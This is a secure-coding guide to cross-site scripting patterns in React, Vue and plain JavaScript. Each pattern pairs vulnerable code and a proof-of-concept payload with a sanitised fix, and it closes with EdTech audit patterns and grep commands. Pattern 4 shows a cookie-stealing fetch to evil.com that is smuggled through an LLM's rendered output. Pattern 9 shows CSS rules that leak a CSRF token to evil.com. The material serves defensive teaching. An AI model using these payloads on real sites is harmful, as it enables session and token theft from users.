# XSS Patterns Per Framework

## React Patterns

### Pattern 1: dangerouslySetInnerHTML with User Content

```tsx
// VULNERABLE: User-generated content rendered as HTML
function Comment({ comment }: { comment: string }) {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}

// PoC payload: <img src=x onerror="alert(document.cookie)">

// FIXED: Sanitize with DOMPurify
import DOMPurify from "dompurify";
function Comment({ comment }: { comment: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment) }} />;
}

// BEST: Use text content, not HTML
function Comment({ comment }: { comment: string }) {
  return <div>{comment}</div>; // React auto-escapes by default
}
```

### Pattern 2: React Markdown with Raw HTML

```tsx
// VULNERABLE: Markdown renderer passes through HTML
import ReactMarkdown from "react-markdown";
import rehypeRaw from "rehype-raw";

<ReactMarkdown rehypePlugins={[rehypeRaw]}>
  {userContent}
</ReactMarkdown>

// PoC: User submits markdown containing:
// <details><summary>Click me</summary><img src=x onerror="alert(1)"></details>

// FIXED: Use rehype-sanitize
import rehypeSanitize from "rehype-sanitize";

<ReactMarkdown rehypePlugins={[rehypeRaw, rehypeSanitize]}>
  {userContent}
</ReactMarkdown>

// SAFEST: Don't use rehype-raw at all
<ReactMarkdown>
  {userContent}
</ReactMarkdown>
```

### Pattern 3: Dynamic href with User Input

```tsx
// VULNERABLE: User controls the URL
function UserLink({ url }: { url: string }) {
  return <a href={url}>Visit</a>;
}
// PoC: url = "javascript:alert(document.cookie)"

// FIXED: Validate protocol
function UserLink({ url }: { url: string }) {
  const safeUrl = url.startsWith("http://") || url.startsWith("https://") ? url : "#";
  return <a href={safeUrl} rel="noopener noreferrer" target="_blank">Visit</a>;
}
```

### Pattern 4: LLM Response Rendered as Rich Content

```tsx
// VULNERABLE: AI response rendered as HTML for formatting
function AIResponse({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// Attack flow:
// 1. User: "Create a quiz with <img src=x onerror='fetch(`https://evil.com?c=${document.cookie}`)'> in it"
// 2. LLM includes the HTML in response
// 3. Frontend renders it → cookie exfiltration

// FIXED: Sanitize LLM output, use markdown renderer without raw HTML
import DOMPurify from "dompurify";
function AIResponse({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ["p", "br", "strong", "em", "ul", "ol", "li", "h1", "h2", "h3", "code", "pre", "blockquote"],
    ALLOWED_ATTR: ["class"],
  }) }} />;
}
```

## Vue Patterns

### Pattern 5: v-html with User Content

```vue
<!-- VULNERABLE -->
<template>
  <div v-html="userComment"></div>
</template>

<!-- PoC: userComment = '<img src=x onerror="alert(1)">' -->

<!-- FIXED: Use v-text or mustache interpolation -->
<template>
  <div>{{ userComment }}</div>
</template>

<!-- If HTML is needed, sanitize first -->
<template>
  <div v-html="sanitizedComment"></div>
</template>
<script>
import DOMPurify from "dompurify";
export default {
  computed: {
    sanitizedComment() { return DOMPurify.sanitize(this.userComment); }
  }
};
</script>
```

## Framework-Agnostic Patterns

### Pattern 6: postMessage Without Origin Check

```typescript
// VULNERABLE: Accepts messages from any origin
window.addEventListener("message", (event) => {
  const data = JSON.parse(event.data);
  document.getElementById("output").innerHTML = data.content; // Double whammy: no origin check + innerHTML
});

// FIXED: Verify origin + sanitize content
window.addEventListener("message", (event) => {
  const allowedOrigins = ["https://teacher.madlen.io", "https://student.madlen.io"];
  if (!allowedOrigins.includes(event.origin)) return;

  const data = JSON.parse(event.data);
  document.getElementById("output").textContent = data.content; // textContent, not innerHTML
});
```

### Pattern 7: SVG Upload XSS

```xml
<!-- Malicious SVG file uploaded as "avatar.svg" -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
  <rect width="100" height="100" fill="red"/>
</svg>
```

```typescript
// VULNERABLE: Rendering uploaded SVGs inline
<img src={`/uploads/${user.avatar}`} /> // Safe if served with correct Content-Type
<div dangerouslySetInnerHTML={{ __html: svgContent }} /> // DANGEROUS: executes scripts

// FIXED: Serve SVGs as images (not inline HTML), or sanitize
// Option 1: Always use <img> tag (scripts don't execute)
<img src={`/uploads/${user.avatar}`} />

// Option 2: Sanitize if inline rendering is needed
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(svgContent) }} />

// Option 3: Convert to PNG/JPEG on upload (safest)
```

### Pattern 8: URL Parameter Reflection

```typescript
// VULNERABLE: Query param reflected in page without escaping
const params = new URLSearchParams(window.location.search);
document.getElementById("search-term").innerHTML = `Results for: ${params.get("q")}`;

// PoC URL: /search?q=<img src=x onerror=alert(1)>

// FIXED: Use textContent
document.getElementById("search-term").textContent = `Results for: ${params.get("q")}`;

// In React (safe by default):
function SearchResults() {
  const [params] = useSearchParams();
  return <h1>Results for: {params.get("q")}</h1>; // React escapes this
}
```

### Pattern 9: CSS Injection for Data Exfiltration

```css
/* Attack: User controls a CSS value */
/* Exfiltrates CSRF token character by character */
input[name="csrf"][value^="a"] { background: url("https://evil.com/leak?char=a"); }
input[name="csrf"][value^="b"] { background: url("https://evil.com/leak?char=b"); }
/* ... for each character */
```

```typescript
// VULNERABLE: User-controlled styles
<div style={{ color: userColor }}> // Relatively safe in React (style objects)
<div style={`color: ${userColor}`}> // DANGEROUS in vanilla JS

// FIXED: Whitelist allowed values
const ALLOWED_COLORS = ["red", "blue", "green", "black"];
const safeColor = ALLOWED_COLORS.includes(userColor) ? userColor : "black";
```

## Real-World EdTech Patterns (from production audits)

### Pattern 10: Math/LaTeX Renderer with dangerouslySetInnerHTML

EdTech apps frequently render mathematical content using KaTeX or MathJax, which outputs HTML. This is a legitimate use of `dangerouslySetInnerHTML` — but it must be verified that the renderer itself sanitizes output.

```tsx
// COMMON IN EDTECH: Math rendering
import katex from "katex";

function MathRenderer({ latex }: { latex: string }) {
  const rendered = katex.renderToString(latex, { throwOnError: false });
  return <span dangerouslySetInnerHTML={{ __html: rendered }} />;
}

// RISK ASSESSMENT:
// - KaTeX's renderToString DOES sanitize output (safe by design)
// - But verify: is `latex` input coming from a trusted source (teacher/system) or untrusted (student)?
// - If student-controlled: KaTeX itself is safe, but the input could be crafted to produce
//   misleading content (not XSS, but integrity concern)

// VERIFY: Check KaTeX version — older versions had XSS issues
// npm info katex version → ensure >= 0.16.x
```

**Search pattern:**
```bash
grep -rn "katex\|mathjax\|renderToString\|MathRenderer\|latex" --include="*.tsx" --include="*.ts" src/ | grep -i "dangerously\|innerHTML"
```

### Pattern 11: Error/System Modal with dangerouslySetInnerHTML

Apps often render system messages (rate limits, maintenance notices) with `dangerouslySetInnerHTML` for rich formatting. These seem safe because the content is "system-generated" — but verify the source.

```tsx
// COMMON: Error modal with HTML content
function RateLimitModal({ message }: { message: string }) {
  return (
    <div className="modal">
      <div dangerouslySetInnerHTML={{ __html: message }} />
    </div>
  );
}

// RISK ASSESSMENT:
// - If `message` comes from a hardcoded string or i18n key → LOW risk
// - If `message` comes from an API response → MEDIUM risk (backend could be compromised)
// - If `message` comes from URL params or user input → CRITICAL

// VERIFY: Trace the data source
// grep -rn "RateLimitModal\|rateLimitMessage\|errorHtml" src/ to find callers
```

### Pattern 12: Curriculum/Learning Outcome Content with HTML

EdTech apps often render curriculum standards or learning outcomes that come from official databases and contain HTML formatting.

```tsx
// COMMON: Curriculum content with HTML formatting
function LearningOutcomeSelector({ outcomes }) {
  return outcomes.map(outcome => (
    <div key={outcome.id} dangerouslySetInnerHTML={{ __html: outcome.description }} />
  ));
}

// RISK ASSESSMENT:
// - If outcomes come from your own curated database → LOW risk (trust the source)
// - If outcomes come from an external curriculum API → MEDIUM risk
// - If teachers can create/edit outcomes → HIGH risk (teacher XSS → student impact)

// SAFER: Sanitize regardless of source (defense in depth)
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(outcome.description) }} />
```
